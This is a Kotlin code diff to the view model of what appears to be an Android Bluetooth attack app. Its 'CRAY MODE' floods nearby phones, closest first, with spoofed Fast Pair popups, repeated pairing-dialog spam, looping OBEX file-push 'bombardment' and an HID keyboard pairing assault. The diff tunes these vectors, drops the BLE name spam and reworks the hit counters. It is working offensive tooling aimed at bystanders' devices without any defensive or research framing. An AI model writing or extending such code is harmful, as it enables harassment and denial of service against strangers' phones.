@@ -89,6 +89,11 @@ class BluetoothHidViewModel : ViewModel() {
     val craySecondsRemaining = MutableStateFlow(0)
     val crayDuration = MutableStateFlow(60) // default 60s
 
+    // ---- Precision pairing stats ----
+    val confirmedHits = MutableStateFlow(0)
+    val skippedTargets = MutableStateFlow(0)
+    val dwellTimeMs = MutableStateFlow(4000L) // how long to keep dialog visible
+
     // Image data for IMAGE / VCARD_PHOTO types
     private var pendingImageBytes: ByteArray? = null
     private var pendingImageMimeType: String = "image/jpeg"
@@ -294,24 +299,26 @@ class BluetoothHidViewModel : ViewModel() {
                     }
                 }
             } else {
-                // Pairing spam mode: BLE ads + createBond()
+                // Precision pairing mode: connect, show dialog, dwell, cancel
                 val name = customDeviceName.value ?: payload.value ?: "Hello"
                 val message = currentPayload?.data?.get("name") ?: name
-                bleAdvertiser.start(context, message)
+
+                // Configure dwell time
+                pairingSpammer.dwellMs = dwellTimeMs.value
+
                 pairingSpammer.start(context, message, targets, discoveredList)
 
-                // Observe pairing + BLE counters
+                // Observe confirmed/skipped counters
                 connectedObserverJob = viewModelScope.launch {
-                    pairingSpammer.connectionAttempts.collect { count ->
-                        val bleCount = bleAdvertiser.broadcastCount.value
-                        _keystrokesSent.postValue(count + bleCount)
+                    pairingSpammer.confirmedCount.collect { confirmed ->
+                        confirmedHits.value = confirmed
+                        _keystrokesSent.postValue(confirmed)
                         _state.postValue(HidState.Attacking(targets.size))
                     }
                 }
                 keystrokeObserverJob = viewModelScope.launch {
-                    bleAdvertiser.broadcastCount.collect { bleCount ->
-                        val pairingCount = pairingSpammer.connectionAttempts.value
-                        _keystrokesSent.postValue(pairingCount + bleCount)
+                    pairingSpammer.skippedCount.collect { skipped ->
+                        skippedTargets.value = skipped
                     }
                 }
             }
@@ -360,6 +367,8 @@ class BluetoothHidViewModel : ViewModel() {
         craySecondsRemaining.value = duration
         _keystrokesSent.value = 0
         _connectedCount.value = 0
+        confirmedHits.value = 0
+        skippedTargets.value = 0
 
         _state.value = HidState.CrayMode(0, duration)
 
@@ -378,33 +387,31 @@ class BluetoothHidViewModel : ViewModel() {
             }
         }
 
-        CrashLogger.log(context, "CrayMode", "CRAY MODE activated! Duration=${duration}s — Fast Pair + pairing + OBEX")
+        CrashLogger.log(context, "CrayMode", "CRAY MODE activated! Duration=${duration}s — precision pairing + OBEX + HID assault")
 
         // === VECTOR 1: Fast Pair spam starts IMMEDIATELY ===
-        // No targets needed — this broadcasts spoofed Fast Pair model IDs
-        // that trigger half-sheet popup notifications on ALL nearby Android phones
         fastPairSpammer.start(context)
-
-        // === VECTOR 2: BLE name spam (legacy, still hits some devices) ===
-        val name = customDeviceName.value ?: "CRAY"
-        bleAdvertiser.start(context, name, crayMode = true)
 
         // After brief initial scan, launch targeted attack vectors
         crayScanJob = viewModelScope.launch {
             delay(2000) // 2 second initial scan window
             launchCrayTargetedAttacks(context)
 
-            // Re-target every 3 seconds — sorted by RSSI (closest first)
+            // Re-target every 8 seconds — sorted by RSSI (closest first)
+            // Longer interval than before because precision pairing takes more time per target
             while (true) {
-                delay(3000)
+                delay(8000)
                 val sortedDevices = getDevicesSortedByRssi()
                 val allAddresses = sortedDevices.map { it.address }.toSet()
                 val currentTargets = selectedTargets.value ?: emptySet<String>()
                 if (allAddresses.size > currentTargets.size) {
-                    // New devices found — restart pairing with RSSI-sorted targets
+                    // New devices found — restart pairing with full list
                     pairingSpammer.stop(context)
                     updateSelectedTargets(allAddresses)
                     _connectedCount.postValue(allAddresses.size)
+
+                    val name = customDeviceName.value ?: "CRAY"
+                    pairingSpammer.dwellMs = dwellTimeMs.value
                     pairingSpammer.start(context, name, allAddresses, sortedDevices, crayMode = true)
 
                     // OBEX-bomb the new devices
@@ -413,7 +420,7 @@ class BluetoothHidViewModel : ViewModel() {
                         obexPusher.pushToDevices(newDevices, buildCrayObexPayload())
                     }
 
-                    CrashLogger.log(context, "CrayMode", "Re-targeted ${allAddresses.size} devices (+${allAddresses.size - currentTargets.size} new), closest RSSI: ${discoveryManager.filter.getAllSortedByRssi().firstOrNull()?.rssi}")
+                    CrashLogger.log(context, "CrayMode", "Re-targeted ${allAddresses.size} devices (+${allAddresses.size - currentTargets.size} new)")
                 }
             }
         }
@@ -441,27 +448,25 @@ class BluetoothHidViewModel : ViewModel() {
         val name = customDeviceName.value ?: "CRAY"
 
         if (allAddresses.isEmpty()) {
-            CrashLogger.log(context, "CrayMode", "No devices found yet, Fast Pair + BLE ads running")
+            CrashLogger.log(context, "CrayMode", "No devices found yet, Fast Pair running")
             return
         }
 
-        // === VECTOR 3: Pairing spam — targets sorted by RSSI ===
-        // Closest devices get hit first for maximum visible impact
+        // === VECTOR 2: Precision pairing — connect, show dialog, dwell, cancel ===
+        pairingSpammer.dwellMs = dwellTimeMs.value
         pairingSpammer.start(context, name, allAddresses, sortedDevices, crayMode = true)
 
-        // === VECTOR 4: OBEX push bombardment ===
+        // === VECTOR 3: OBEX push — trigger "Accept file?" dialogs ===
         val obexPayload = buildCrayObexPayload()
         obexPusher.pushToDevices(sortedDevices, obexPayload)
 
-        // === VECTOR 5: HID Keyboard Pairing Assault (API 28+) ===
-        // Registers as a real HID keyboard and connects — triggers the PIN pairing
-        // dialog instead of the generic bond dialog. Much higher impact per hit.
+        // === VECTOR 4: HID Keyboard Pairing Assault (API 28+) ===
         hidPairingSpammer?.start(context, sortedDevices)
 
-        // Continuous OBEX re-push loop every 8 seconds
+        // Continuous OBEX re-push loop every 12 seconds
         crayObexJob = viewModelScope.launch {
             while (true) {
-                delay(8000)
+                delay(12000)
                 val devices = getDevicesSortedByRssi()
                 if (devices.isNotEmpty()) {
                     obexPusher.pushToDevices(devices, obexPayload)
@@ -469,46 +474,30 @@ class BluetoothHidViewModel : ViewModel() {
             }
         }
 
-        // Observe ALL counters (Fast Pair + BLE + pairing + OBEX + HID assault)
-        val hidHits = { hidPairingSpammer?.hitCount?.value ?: 0 }
+        // Observe precision pairing confirmed/skipped
         connectedObserverJob = viewModelScope.launch {
-            fastPairSpammer.spamCount.collect { fpCount ->
-                val pairingCount = pairingSpammer.connectionAttempts.value
-                val bleCount = bleAdvertiser.broadcastCount.value
-                val obexCount = obexPusher.pushCount.value
-                _keystrokesSent.postValue(fpCount + pairingCount + bleCount + obexCount + hidHits())
+            pairingSpammer.confirmedCount.collect { confirmed ->
+                confirmedHits.value = confirmed
+                val hidHits = hidPairingSpammer?.hitCount?.value ?: 0
+                _keystrokesSent.postValue(confirmed + hidHits)
             }
         }
         keystrokeObserverJob = viewModelScope.launch {
-            pairingSpammer.connectionAttempts.collect { count ->
-                val fpCount = fastPairSpammer.spamCount.value
-                val bleCount = bleAdvertiser.broadcastCount.value
-                val obexCount = obexPusher.pushCount.value
-                _keystrokesSent.postValue(fpCount + count + bleCount + obexCount + hidHits())
+            pairingSpammer.skippedCount.collect { skipped ->
+                skippedTargets.value = skipped
             }
         }
-        attackLoopJob = viewModelScope.launch {
-            bleAdvertiser.broadcastCount.collect { bleCount ->
-                val fpCount = fastPairSpammer.spamCount.value
-                val pairingCount = pairingSpammer.connectionAttempts.value
-                val obexCount = obexPusher.pushCount.value
-                _keystrokesSent.postValue(fpCount + pairingCount + bleCount + obexCount + hidHits())
-            }
-        }
-        // Also observe HID assault counter
+        // Observe HID assault counter
         hidPairingSpammer?.let { hid ->
             crayHidJob = viewModelScope.launch {
                 hid.hitCount.collect { hidCount ->
-                    val fpCount = fastPairSpammer.spamCount.value
-                    val pairingCount = pairingSpammer.connectionAttempts.value
-                    val bleCount = bleAdvertiser.broadcastCount.value
-                    val obexCount = obexPusher.pushCount.value
-                    _keystrokesSent.postValue(fpCount + pairingCount + bleCount + obexCount + hidCount)
+                    val confirmed = pairingSpammer.confirmedCount.value
+                    _keystrokesSent.postValue(confirmed + hidCount)
                 }
             }
         }
 
-        CrashLogger.log(context, "CrayMode", "ALL vectors launched: Fast Pair + BLE ads + pairing + OBEX + HID keyboard assault (${sortedDevices.size} targets, RSSI-sorted)")
+        CrashLogger.log(context, "CrayMode", "Vectors launched: precision pairing + OBEX + HID assault (${sortedDevices.size} targets, RSSI-sorted)")
     }
 
     fun stopCrayMode(context: Context) {
@@ -528,7 +517,6 @@ class BluetoothHidViewModel : ViewModel() {
 
         fastPairSpammer.stop()
         pairingSpammer.stop(context)
-        bleAdvertiser.stop(context)
         hidPairingSpammer?.stop(context)
 
         // Stop discovery that's been running the whole time
